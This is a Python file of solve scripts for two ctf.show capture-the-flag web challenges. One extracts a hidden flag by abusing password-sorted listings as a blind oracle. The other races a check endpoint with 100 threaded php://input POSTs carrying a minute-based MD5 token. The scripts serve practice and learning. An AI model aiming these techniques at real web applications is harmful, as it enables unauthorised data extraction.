import time
import requests
import hashlib
import threading

############ CTFshow web1
def ctfshow_web_1():
    url = "http://89c66621-11ae-44e8-b3db-50854912a6bd.challenge.ctf.show"
    url1= url + "/reg.php" #注册页面
    url2= url + "/login.php"#登录界面
    url3= url + "/user_main.php?order=pwd" #查询界面
    currentStr=""
    key = 0
    s = "-.0123456789:abcdefghijklmnopqrstuvwxyz{}|~"
    for j in range(0,45):
        if (key == 1):
            break;
        print("*")
        for i in s:
            l = ""
            l = currentStr + i
            l2 = currentStr + chr(ord(i)-1)
            data = {'username':l,
                    'email':'c',
                    'nickname':'c',
                    'password':l
                    }
            data2 = {'username':l,
                      'password':l
                    }
            if (l=='flag'):
                currentStr='flag'
                print(currentStr)
                break
            session = requests.session()
            r1 = session.post(url1,data)
            time.sleep(0.1)
            r2 = session.post(url2,data)
            time.sleep(0.1)
            r3 = session.get(url3)
            t = r3.text
            if (t.index("<td>"+l+"</td>")>t.index("<td>flag@ctf.show</td>")):
                currentStr=l2
                print(currentStr)
                if(i=="~"):
                    key=1
                break
#ctfshow_web_1()


############ ctf.show_红包题第六弹
def ctf_show_hongbao_6():
    i = str(time.localtime().tm_min)
    m = hashlib.md5(i.encode()).hexdigest()
    url = "http://2625e7be-c378-47f3-a74a-7be2a8c153e0.challenge.ctf.show/check.php?token={}&php://input".format(m)

    def POST(data):
        try:
            r = requests.post(url,data=data)
            if "ctfshow" in r.text:
                print(r.text)
                pass
            pass
        except Exception as e:
            print("出错了")
            pass
        pass

    with open('./resource/key.dat','rb') as file:
        data1 = file.read()
        pass
    for i in range(50):
        threading.Thread(target=POST,args=(data1,)).start()
    for i in range(50):
        data2 = 'xixixix'
        threading.Thread(target=POST,args=(data2,)).start()
ctf_show_hongbao_6()

